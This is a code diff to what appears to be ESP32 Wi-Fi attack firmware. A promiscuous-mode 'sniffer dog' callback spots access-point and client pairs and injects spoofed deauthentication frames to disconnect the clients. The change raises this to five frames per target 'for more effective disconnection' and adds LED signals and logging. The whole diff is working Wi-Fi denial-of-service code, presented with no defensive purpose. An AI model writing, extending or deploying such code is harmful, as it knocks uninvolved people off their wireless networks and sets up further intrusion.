@@ -3846,6 +3846,7 @@ void app_main(void) {
     vTaskDelay(pdMS_TO_TICKS(500));
     MY_LOG_INFO(TAG,"BOARD READY");
     vTaskDelay(pdMS_TO_TICKS(100));
+    
 }
 
 void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count) {   
@@ -4895,7 +4896,7 @@ static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_typ
         return;
     }
     
-    // We have a valid AP-STA pair! Send deauth packet
+    // We have a valid AP-STA pair! Send 5 deauth packets
     // Create deauth frame from AP to STA (not broadcast!)
     uint8_t deauth_frame[sizeof(deauth_frame_default)];
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
@@ -4907,12 +4908,22 @@ static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_typ
     // Set BSSID to AP
     memcpy(&deauth_frame[16], ap_mac, 6);
     
-    // Send the deauth frame
-    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+    // Send 5 deauth frames for more effective disconnection
+
+    // Blue LED flash to indicate deauth sent
+    led_strip_set_pixel(strip, 0, 0, 0, 255); // Blue
+    led_strip_refresh(strip);
+
+    for (int i = 0; i < 5; i++) {
+        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+    }
     deauth_sent_count++;
     
+    led_strip_set_pixel(strip, 0, 255, 0, 0); // Back to red
+    led_strip_refresh(strip);
+    
     // Log statistics for this AP-STA pair
-    MY_LOG_INFO(TAG, "[SnifferDog #%lu] DEAUTH sent: AP=%02X:%02X:%02X:%02X:%02X:%02X -> STA=%02X:%02X:%02X:%02X:%02X:%02X (Ch=%d, RSSI=%d)",
+    MY_LOG_INFO(TAG, "[SnifferDog #%lu] 5x DEAUTH sent: AP=%02X:%02X:%02X:%02X:%02X:%02X -> STA=%02X:%02X:%02X:%02X:%02X:%02X (Ch=%d, RSSI=%d)",
                deauth_sent_count,
                ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
                sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5],
